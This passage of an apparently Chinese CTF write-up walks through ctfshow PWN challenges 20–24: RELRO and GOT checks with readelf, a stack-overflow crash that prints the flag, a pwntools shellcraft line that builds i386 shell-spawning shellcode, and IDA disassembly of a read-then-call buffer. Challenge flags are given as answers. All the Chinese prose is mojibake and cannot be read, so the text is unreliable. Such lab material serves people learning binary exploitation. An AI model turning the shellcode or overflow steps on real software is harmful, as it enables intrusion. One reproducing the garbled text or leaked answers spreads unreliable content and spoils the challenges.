<p>å› ä¸ºä»£ç ä¸­æ ‡å‡†è¾“å‡ºè¢«å…³é—­äº†ï¼ˆæ— æ³•æ˜¾ç¤ºï¼‰ï¼Œä½†æ ‡å‡†è¾“å…¥ï¼ˆé€šå¸¸æ˜¯ç»ˆç«¯ï¼‰ä»ç„¶å¯ç”¨ï¼Œæ‰€ä»¥é€šè¿‡è¿™ä¸ªé‡å®šå‘ï¼Œ<code>cat</code> å‘½ä»¤çš„è¾“å‡ºä¼šè¢« â€œè½¬ç§»â€ åˆ°æ ‡å‡†è¾“å…¥å¯¹åº”çš„ç»ˆç«¯ï¼Œä»è€Œè®©å†…å®¹èƒ½æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p>ç®€å•è¯´å°±æ˜¯ï¼šæ­£å¸¸æ˜¾ç¤ºå†…å®¹çš„ â€œè¾“å‡ºé€šé“â€ è¢«å…³äº†ï¼Œä½†æ¥æ”¶è¾“å…¥çš„ â€œè¾“å…¥é€šé“â€ è¿˜èƒ½ç”¨ã€‚é€šè¿‡ 1&gt;&amp;0 æŠŠåŸæœ¬è¯¥ä» â€œè¾“å‡ºé€šé“â€ æ˜¾ç¤ºçš„å†…å®¹ï¼Œè½¬åˆ° â€œè¾“å…¥é€šé“â€ å¯¹åº”çš„ç»ˆç«¯ä¸Šï¼Œè¿™æ ·å°±èƒ½çœ‹åˆ° flag äº†ã€‚ctfshow{a390a91b-5203-46ae-812d-0396de95184f}</p>
<p>æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨äº† â€œè¾“å…¥é€šé“å’Œç»ˆç«¯è¿˜è¿ç€â€ è¿™ä¸ªæ¼æ´ï¼Œè®©å†…å®¹ â€œå€Ÿé“â€ æ˜¾ç¤ºå‡ºæ¥ï½ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/49.png"
	width="1030"
	height="550"
	srcset="/p/ctfshow-pwn-writeup/49_hu_9e7f3c9c7cb0a617.png 480w, /p/ctfshow-pwn-writeup/49_hu_2a293b314017f370.png 1024w"
	loading="lazy"
	
		alt="é‡å®šå‘"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="449px"
	
></p>
<h3 id="pwn_020">PWN_020
</h3><p>é¢˜ç›®ï¼šæäº¤ctfshow{ã€.gotè¡¨ä¸.got.pltæ˜¯å¦å¯å†™(å¯å†™ä¸º1ï¼Œä¸å¯å†™ä¸º0)ã€‘,ã€.gotçš„åœ°å€ã€‘,ã€.got.pltçš„åœ°å€ã€‘}</p>
<p>ä¾‹å¦‚ .gotå¯å†™.got.pltè¡¨å¯å†™å…¶åœ°å€ä¸º0x400820 0x8208820</p>
<p>æœ€ç»ˆflagä¸ºctfshow{1_1_0x400820_0x8208820}</p>
<p>è‹¥æŸä¸ªè¡¨ä¸å­˜åœ¨ï¼Œåˆ™æ— éœ€å†™å…¶å¯¹åº”åœ°å€</p>
<p>å¦‚ä¸å­˜åœ¨.got.pltè¡¨ï¼Œåˆ™æœ€ç»ˆflagå€¼ä¸ºctfshow{1_0_0x400820}</p>
<p><a class="link" href="PWN_020" >PWN_020</a></p>
<hr>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/50.png"
	width="600"
	height="155"
	srcset="/p/ctfshow-pwn-writeup/50_hu_5395d84a6ce1faca.png 480w, /p/ctfshow-pwn-writeup/50_hu_d78e65288b53f8ce.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="387"
		data-flex-basis="929px"
	
></p>
<p>åœ¨è¿™é‡Œåªå¼€äº†NXä¿æŠ¤ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/51.png"
	width="755"
	height="264"
	srcset="/p/ctfshow-pwn-writeup/51_hu_ec1407a9bbbb57d8.png 480w, /p/ctfshow-pwn-writeup/51_hu_5eec920743e7e000.png 1024w"
	loading="lazy"
	
		alt="Hintæç¤ºï¼šä»€ä¹ˆæ˜¯RETROä¿æŠ¤"
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="686px"
	
></p>
<p>åœ¨<a class="link" href="https://expl0rer.top/p/pwn-1/#relro"  target="_blank" rel="noopener"
    >PWN-1çš„Linuxå®‰å…¨é˜²æŠ¤æœºåˆ¶</a>è¿™ä¸€ç« çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬æœ‰è®¤è¯†åˆ°RELROè¿™ä¸ªä¿æŠ¤ã€‚å¾ˆæ˜¾ç„¶no RELROæ„å‘³ç€.gotå’Œ.got.pltè¡¨éƒ½å¯å†™ã€‚</p>
<p>ç”¨æŒ‡ä»¤æŸ¥è¡¨åœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">readelf -S PWN_020
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/52.png"
	width="1044"
	height="630"
	srcset="/p/ctfshow-pwn-writeup/52_hu_9e02d9e9ca78633b.png 480w, /p/ctfshow-pwn-writeup/52_hu_cfc6139e4ad6cdf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="165"
		data-flex-basis="397px"
	
></p>
<p>è€å¿ƒæ‰¾ä¸€ä¸‹å°±æ‰¾åˆ°äº†ï¼Œæ•…flag:ctfshow{1_1_0x600f18_0x600f28}</p>
<h3 id="pwn_021">PWN_021
</h3><p>é¢˜ç›®ï¼šæäº¤ctfshow{ã€.gotè¡¨ä¸.got.pltæ˜¯å¦å¯å†™(å¯å†™ä¸º1ï¼Œä¸å¯å†™ä¸º0)ã€‘,ã€.gotçš„åœ°å€ã€‘,ã€.got.pltçš„åœ°å€ã€‘}</p>
<p>ä¾‹å¦‚ .gotå¯å†™.got.pltè¡¨å¯å†™å…¶åœ°å€ä¸º0x400820 0x8208820</p>
<p>æœ€ç»ˆflagä¸ºctfshow{1_1_0x400820_0x8208820}</p>
<p>è‹¥æŸä¸ªè¡¨ä¸å­˜åœ¨ï¼Œåˆ™æ— éœ€å†™å…¶å¯¹åº”åœ°å€</p>
<p>å¦‚ä¸å­˜åœ¨.got.pltè¡¨ï¼Œåˆ™æœ€ç»ˆflagå€¼ä¸ºctfshow{1_0_0x400820}</p>
<p><a class="link" href="PWN_021" >PWN_021</a></p>
<hr>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/53.png"
	width="1215"
	height="610"
	srcset="/p/ctfshow-pwn-writeup/53_hu_8be2513129fe3dd3.png 480w, /p/ctfshow-pwn-writeup/53_hu_b1f2d1e70b5f95ba.png 1024w"
	loading="lazy"
	
		alt="partial Relroä¿æŠ¤"
	
	
		class="gallery-image" 
		data-flex-grow="199"
		data-flex-basis="478px"
	
></p>
<p>è¦è¿˜ä¸è®°å¾—Relroä¿æŠ¤æœºåˆ¶åŸç†çš„å°±å›PWN-1å»çœ‹å§&hellip;</p>
<p>è¿™é‡Œæ˜¯ GOT è¡¨çš„å‰åŠéƒ¨åˆ†ï¼ˆ.got.pltï¼‰è®¾ç½®ä¸ºåªè¯»ï¼ŒååŠéƒ¨åˆ†ï¼ˆ.gotï¼‰ä»å¯å†™ã€‚</p>
<p>ç”¨readelfå‘½ä»¤å»çˆ±çœ‹è¡¨åœ°å€å°±å¥½äº†ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/54.png"
	width="670"
	height="114"
	srcset="/p/ctfshow-pwn-writeup/54_hu_8d769b287fb3ac64.png 480w, /p/ctfshow-pwn-writeup/54_hu_3cbf63d5305f0ffc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="587"
		data-flex-basis="1410px"
	
></p>
<p>flag:ctfshow{0_1_0x600ff0_0x601000}</p>
<h3 id="pwn_021-1">PWN_021
</h3><p>é¢˜ç›®ï¼šæäº¤ctfshow{ã€.gotè¡¨ä¸.got.pltæ˜¯å¦å¯å†™(å¯å†™ä¸º1ï¼Œä¸å¯å†™ä¸º0)ã€‘,ã€.gotçš„åœ°å€ã€‘,ã€.got.pltçš„åœ°å€ã€‘}</p>
<p>ä¾‹å¦‚ .gotå¯å†™.got.pltè¡¨å¯å†™å…¶åœ°å€ä¸º0x400820 0x8208820</p>
<p>æœ€ç»ˆflagä¸ºctfshow{1_1_0x400820_0x8208820}</p>
<p>è‹¥æŸä¸ªè¡¨ä¸å­˜åœ¨ï¼Œåˆ™æ— éœ€å†™å…¶å¯¹åº”åœ°å€</p>
<p>å¦‚ä¸å­˜åœ¨.got.pltè¡¨ï¼Œåˆ™æœ€ç»ˆflagå€¼ä¸ºctfshow{1_0_0x400820}</p>
<p><a class="link" href="PWN_021" >PWN_021</a></p>
<hr>
<p>é“ç†ä¸€æ ·checksecçœ‹relroçš„ä¿æŠ¤ã€readelfçœ‹è¡¨&hellip;..</p>
<p><img src="/p/ctfshow-pwn-writeup/55.png"
	width="725"
	height="153"
	srcset="/p/ctfshow-pwn-writeup/55_hu_4f21e41ae9717f96.png 480w, /p/ctfshow-pwn-writeup/55_hu_9ef604a41c7706ab.png 1024w"
	loading="lazy"
	
		alt=".gotã€.got.pltè¡¨éƒ½ä¸å¯å†™"
	
	
		class="gallery-image" 
		data-flex-grow="473"
		data-flex-basis="1137px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/56.png"
	width="705"
	height="101"
	srcset="/p/ctfshow-pwn-writeup/56_hu_fd84664444ae0205.png 480w, /p/ctfshow-pwn-writeup/56_hu_beb3fc8924561d37.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="698"
		data-flex-basis="1675px"
	
></p>
<p>è¿™æ¬¡å°±åªæœ‰ä¸€ä¸ª.gotè¡¨äº†ï¼Œé‚£å°±æ˜¯flagï¼šctfshow{0_0_0x600fc0}</p>
<h3 id="pwn_023">PWN_023
</h3><p>é¢˜ç›®ï¼šç”¨æˆ·åä¸º ctfshow å¯†ç  ä¸º 123456 è¯·ä½¿ç”¨ sshè½¯ä»¶è¿æ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh ctfshow@é¢˜ç›®åœ°å€ -pé¢˜ç›®ç«¯å£å·
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>ä¸æ˜¯ncè¿æ¥</strong>   <a class="link" href="PWN_023" >PWN_023</a></p>
<p><img src="/p/ctfshow-pwn-writeup/57.png"
	width="695"
	height="140"
	srcset="/p/ctfshow-pwn-writeup/57_hu_55b6f42bf446c46b.png 480w, /p/ctfshow-pwn-writeup/57_hu_a8dd5de87eab3f4f.png 1024w"
	loading="lazy"
	
		alt="checksecä¸€ä¸‹"
	
	
		class="gallery-image" 
		data-flex-grow="496"
		data-flex-basis="1191px"
	
></p>
<p>æ²¡æœ‰canaryä¿æŠ¤ï¼Œè¿™å¯ä»¥æ˜¯ä¸ªçªç ´ç‚¹ï¼šæ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p>çœ‹å›IDAï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/58.png"
	width="1060"
	height="615"
	srcset="/p/ctfshow-pwn-writeup/58_hu_803795aedfc75284.png 480w, /p/ctfshow-pwn-writeup/58_hu_31f0d9d5938f057f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="413px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°</p>
<p><img src="/p/ctfshow-pwn-writeup/59.png"
	width="669"
	height="159"
	srcset="/p/ctfshow-pwn-writeup/59_hu_14eb223bc3e77877.png 480w, /p/ctfshow-pwn-writeup/59_hu_99cf8a4061518c1e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="420"
		data-flex-basis="1009px"
	
></p>
<p>å¯ä»¥çŸ¥é“ï¼Œä¸€å¼€å§‹dgetså‡½æ•°è¯»å–flagå­—ç¬¦ä¸²åˆ°å†…å­˜ä¸­</p>
<p>è·Ÿè¿›signalå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/60.png"
	width="529"
	height="139"
	srcset="/p/ctfshow-pwn-writeup/60_hu_e4f58d85598c5ca3.png 480w, /p/ctfshow-pwn-writeup/60_hu_e7413abc36f52d2b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="380"
		data-flex-basis="913px"
	
></p>
<p>è¿™è¡Œä»£ç ä¼šå°†å†…å­˜ä¸­å­˜å‚¨çš„ <code>flag</code> å­—ç¬¦ä¸²ï¼Œè¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯æµï¼ˆ<code>stderr</code>ï¼‰ã€‚å› ä¸ºç¨‹åºå¯åŠ¨æ—¶å·²ç»é€šè¿‡ <code>fgets</code> ä» <code>/ctfshow_flag</code> æ–‡ä»¶è¯»å–äº† flag å†…å®¹åˆ° <code>flag</code> å˜é‡ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œèƒ½ç›´æ¥æ‰“å°å‡ºæ­£ç¡®çš„ flagã€‚</p>
<p>æ‰€ä»¥è¯´æˆ‘ä»¬è®©ç¨‹åºæŠ¥é”™ä¹Ÿå°±æ˜¯è®©å®ƒæ ˆæº¢å‡ºï¼Œè¦†ç›–åçš„åœ°å€è¿˜ä¸èƒ½æ˜¯æœ‰æ•ˆåœ°å€ï¼Œè®©å®ƒå…¨éƒ¨æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥è¾“å…¥å¥½å¤šä¸ªaå°±è¡Œï¼Œå‡ åä¸ªaçš„16è¿›åˆ¶åœ°å€æ˜¯æ— æ•ˆåœ°å€ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/61.png"
	width="945"
	height="394"
	srcset="/p/ctfshow-pwn-writeup/61_hu_dbfd74188df09469.png 480w, /p/ctfshow-pwn-writeup/61_hu_a8d8dd6c093b2cde.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="575px"
	
></p>
<p>å…³äºæ ˆæº¢å‡ºè¿™éƒ¨åˆ†ï¼Œè¯·çœ‹<a class="link" href="https://expl0rer.top/p/pwn-2/"  target="_blank" rel="noopener"
    >PWN-2</a>è¯¦ç»†å­¦ä¹ ï¼ŒPWNæ¿å—å æ¯”ä¹Ÿæ˜¯é‡è¦çš„ã€‚</p>
<p>é€æ¸å¼€å§‹ä¸Šå¼ºåº¦äº†ï¼Œè¿™æ—¶éœ€è¦ä»”ç»†çœ‹IDAçš„ä»£ç åˆ†æäº†ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆå·¥ä½œåŸç†ã€‚</p>
<p>flagï¼šctfshow{0f207f1f-71bb-4cdd-bdab-7bfb9acde27a}</p>
<h3 id="pwn_024">PWN_024
</h3><h4 id="é¢˜ç›®">é¢˜ç›®ï¼š
</h4><p>ä½ å¯ä»¥ä½¿ç”¨<code>pwntools</code>çš„<code>shellcraft</code>æ¨¡å—æ¥è¿›è¡Œæ”»å‡»</p>
<p><a class="link" href="PWN_024" >PWN_024</a></p>
<p>æˆ‘æ¥ä»‹ç»ä¸€ä¸‹shellcraftæ¨¡å—ï¼šå®ƒæ˜¯ pwntools åº“ä¸­çš„ä¸€ä¸ªå­æ¨¡å—ï¼Œç”¨äºç”Ÿæˆå„ç§ä¸åŒä½“ç³»ç»“æ„çš„ Shellcodeï¼ˆè¿™é‡Œçš„ä¸åŒä½“ç³»æ˜¯æˆ‘ä»¬ä¹‹å‰å­¦è¿‡çš„<a class="link" href="https://expl0rer.top/p/%e7%bd%91%e5%ae%89%e5%ad%a6%e4%b9%a0%e7%ac%ac%e4%b8%80%e9%98%b6%e6%ae%b5/#%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%9f%ba%e7%a1%80"  target="_blank" rel="noopener"
    >æ“ä½œç³»ç»ŸåŸºç¡€çš„æœ‰å…³shellçš„é‚£ä¸€ç« èŠ‚</a>ï¼‰æœ‰zshã€bashç­‰ã€‚Shellcode æ˜¯ä¸€æ®µä»¥äºŒè¿›åˆ¶å½¢å¼ç¼–å†™çš„ä»£ç ï¼Œç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´ã€æ‰§è¡Œç‰¹å®šæ“ä½œæˆ–è·å–ç³»ç»Ÿæƒé™ã€‚shellcraft æ¨¡å—æä¾›äº†ä¸€ç³»åˆ—å‡½æ•°å’Œæ–¹æ³•ï¼Œç”¨äºç”Ÿæˆç‰¹å®šä½“ç³»ç»“æ„ä¸‹çš„Shellcodeã€‚</p>
<p>ç”Ÿæˆçš„æ±‡ç¼–ä»£ç å¯ç›´æ¥é€šè¿‡ asm() å‡½æ•°è½¬æ¢ä¸ºæœºå™¨ç ï¼ˆäºŒè¿›åˆ¶ï¼‰ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†æ ¼å¼ï¼Œä¾‹å¦‚ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>  <span class="c1"># ä¸€æ­¥å®Œæˆâ€œæ±‡ç¼–æ¨¡æ¿â†’æœºå™¨ç â€è½¬æ¢ï¼Œç±»ä¼¼Cè¯­è¨€çš„ç¼–è¯‘å™¨åŠŸèƒ½ï¼Œè½¬æ¢æˆæœºå™¨è¯­è¨€ã€‚</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>IDAï¼šå¯ä»¥çœ‹åˆ°è¿™é¢˜ä¼¼ä¹å’Œret2shellcodeæœ‰å…³</p>
<p><img src="/p/ctfshow-pwn-writeup/63.png"
	width="1045"
	height="415"
	srcset="/p/ctfshow-pwn-writeup/63_hu_8320440ce8e9ad20.png 480w, /p/ctfshow-pwn-writeup/63_hu_f063bc9aa051b388.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="604px"
	
></p>
<p>çœ‹é¢˜ç›®æç¤ºï¼Œè¿›å…¥æ–°å¤§é™†äº†&hellip;ç”¨pwntoolsäº†ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/64.png"
	width="710"
	height="295"
	srcset="/p/ctfshow-pwn-writeup/64_hu_2df4fc228f333ed2.png 480w, /p/ctfshow-pwn-writeup/64_hu_ff2fcff08e5e36b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="240"
		data-flex-basis="577px"
	
></p>
<p>è¿™é‡Œæœ‰æç¤ºï¼Œå¯ä»¥çœ‹ä¸€ä¸‹<a class="link" href="https://expl0rer.top/p/pwn-1/#nx"  target="_blank" rel="noopener"
    >PWN-1-NXä¿æŠ¤</a>ï¼Œæœ‰å•¥å¯å‘ï¼Ÿ</p>
<p>åœ¨IDAåˆ†æå¯çŸ¥ï¼Œctfshowå‡½æ•°æ— æ³•è·Ÿè¿›æºä»£ç ï¼Œåªèƒ½çœ‹å®ƒçš„ä¼ªä»£ç å»åˆ†æäº†ï¼ˆæ¯”è¾ƒé•¿ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; Attributes: bp-based frame</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; int __cdecl ctfshow(_DWORD)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">public</span> <span class="nv">ctfshow</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">ctfshow</span>         <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; CODE XREF: main+132â†“p</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">buf</span>             <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">88h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">var_4</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; __unwind {</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C7</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C9</span>                 <span class="nv">push</span>    <span class="nb">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">CA</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">84h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D0</span>                 <span class="nv">call</span>    <span class="nv">__x86_get_pc_thunk_bx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D5</span>                 <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">(</span><span class="nv">offset</span> <span class="nv">_GLOBAL_OFFSET_TABLE_</span> <span class="o">-</span> <span class="kc">$</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="kd">DB</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">DE</span>                 <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nbytes</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E3</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E9</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; buf</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EA</span>                 <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; fd</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EC</span>                 <span class="nv">call</span>    <span class="nv">_read</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F1</span>                 <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F4</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F7</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FD</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; s</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FE</span>                 <span class="nv">call</span>    <span class="nv">_puts</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048503</span>                 <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048506</span>                 <span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">C</span>                 <span class="nv">call</span>    <span class="nb">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">E</span>                 <span class="nv">nop</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048512</span>                 <span class="nf">leave</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>                 <span class="nf">retn</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="c1">; } // starts at 80484C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="nf">ctfshow</span>         <span class="nv">endp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
